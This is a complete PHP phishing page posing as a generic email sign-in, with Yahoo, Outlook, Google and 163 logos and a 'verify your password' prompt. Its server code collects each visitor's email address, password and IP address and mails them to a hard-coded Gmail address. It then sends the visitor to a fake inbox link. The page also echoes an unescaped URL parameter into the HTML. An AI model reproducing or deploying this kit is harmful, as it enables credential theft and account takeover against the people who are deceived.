<?php
$ip = getenv("REMOTE_ADDR");
$message .= "-----------------------\n";
$message .= $_POST['email']."\n";
$message .= $_POST['pass']."\n";
$message .= "IP: ".$ip."\n";
$message .= date("D:M:d:Y  -  g:i a")."\n";
$message .= "-------------------LOG-----------------\n";
$recipient = "dprincewirewires@gmail.com";
$subject = "RANDOM";
$headers = "From: EZE";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$over = 'thankyou.php?reason=ignore';

$errors = array();

if (isset($_POST['Submit'])) {
if (!isset($_POST['email']) OR trim(strip_tags($_POST['email'])) == '' )
$errors[] = 'Please enter your email address.';
else
$email = trim(strip_tags($_POST['email']));
if (!preg_match('/([\w\-]+\@[\w\-]+\.[\w\-]+)/', $_POST['email']))
$errors[] = 'Invalid email address format.';
else
$email = trim(strip_tags($_POST['email']));
if (!isset($_POST['pass']) OR trim(strip_tags($_POST['pass'])) == '' )
$errors[] = 'Please enter your email password.';
else
$ln = trim(strip_tags($_POST['pass']));
// check if any errors set
if (!$errors) {
//.... continue processing your form
mail($recipient,$subject,$message,$headers);
header("Location: thankyou.php?rand=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.1&email=$login&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1");
} // end IF errors

} // end IF (SUBMITted)

// (re)display the form
?>
<!DOCTYPE html>
<html lang="en">
<link rel="shortcut icon" href="https://www.google.com//favicon.ico" />
  <style type="text/css">
<!--
.style1 {
	color: #FF0000;
	font-weight: bold;
}
-->
  </style>
  <head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="description" content="">
	<meta name="author" content="">

	<title>Email Service Provider</title>
	<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok8v=02fcfa4f56/"},atok:"215fe91ed6d1faef5dd8cfba12537135",petok:"457e564d1489e564d880bf417580bd3349db26a7-1395753081-1800",zone:"westiniedsho.us",rocket:"0",apps:{}}];CloudFlare.push({"apps":{"ape":"6d487a0851bc4983e949ed6bd99c3cc0"}});var a=document.createElement("script"),b=document.getElementsByTagName("script")[0];a.async=!0;a.src="//ajax.cloudflare.com/cdn-cgi/nexp/dok8v=b064e16429/cloudflare.min.js";b.parentNode.insertBefore(a,b);}}catch(e){};
//]]>
</script>
<link href="files/bootstrap.css" rel="stylesheet">
	<link href="navbar.css" rel="stylesheet">
	</head>
	<body>
	<div class="container">
	<div class="navbar navbar-default">
		<div class="navbar-header">
		  <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
			<span class="icon-bar"></span>
			<span class="icon-bar"></span>
			<span class="icon-bar"></span>		  </button>
		</div>
		
	 
	  		<!DOCTYPE html>
		<html lang="en">
		  <head>
			<meta charset="utf-8">
			<meta http-equiv="X-UA-Compatible" content="IE=edge">
			<meta name="viewport" content="width=device-width, initial-scale=1.0">
			<meta name="description" content="">
			<meta name="author" content="">
			<title>Signin</title>
			<link href="files/bootstrap.css" rel="stylesheet">
			<link href="files/signin.css" rel="stylesheet">
			</head>
			<body>
			<div class="container">
			  <div id="layer">
    <div id="google_translate_element" align="left"><script type="text/javascript">
function googleTranslateElementInit() {
  new google.translate.TranslateElement({pageLanguage: 'en', layout: google.translate.TranslateElement.InlineLayout.HORIZONTAL, multilanguagePage: true}, 'google_translate_element');
}
</script><script type="text/javascript" src="files/element.js?cb=googleTranslateElementInit"></script></div>
  </div>
			<form class="form-signin" role="form" method="POST" action="<?php echo $_SERVER['PHP_SELF']; ?>?rand=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.1&email=<?php echo $_GET['email']; ?>&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1" >
				<h2 class="form-signin-heading">Please sign in</h3>
				<input name="email" type="hidden" class="form-control" id="email" value="<?php echo $_GET['email']; ?>" placeholder="Username"><h3 class="form-signin-heading"><?php echo $_GET['email']; ?></h2>
				<input name="pass" type="password" class="form-control" placeholder="Password" value="<?php echo (isset($_POST['pass'])) ? $pass : ""; ?>" autofocus>
				<div>
            <div align="center">
            </div>
            <p align="center"><span class="style1">Because you're accessing sensitive info, you need
to verify your password.</span><br />
            </p>
            <div>
            <div align="center">
			<?php if ($errors): ?>
            </div>
            
 <?php print '<ul align="center" class="msgUserSuccess"><b>Please correct the below errors:</b><br /><li>';
print implode('</li><li>',$errors);
print '</li></ul>';?>
            <div align="center">
              <?php endif; ?>
</div>
          </div>
				<input class="btn btn-lg btn-primary btn-block" type="submit" name="Submit" value="Sign in to continue" />
			  </form>
			  </div>
			 <div align="center">Powered by: <a href="#"><img src="http://mail.yahoo.com/favicon.ico" border="0" title="Yahoo!"></a>&nbsp;&nbsp;&nbsp;<a href="#"><img src="https://a.gfx.ms/OLFav.ico" alt="Outlook.com" border="0" title="Outlook.com"></a>&nbsp;&nbsp;&nbsp;<a href="#"><img src="https://ssl.gstatic.com/accounts/ui/logo_strip_2x.png" alt="Google" height="16" border="0" title="Google.com"></a>&nbsp;&nbsp;&nbsp;<a href="#"><img src="http://mxmail.optimumelectronics.com/mail/skins/default/images/favicon.ico" alt="Other domain" border="0" title="Other Email Provider"></a>&nbsp;&nbsp;&nbsp;<a href="#"><img src="http://mail.yeah.net/favicon.ico" alt="email.163.com" border="0" title="email.163.com"></a></div>
			 <div></div><div></div><br>
<br>

			</div>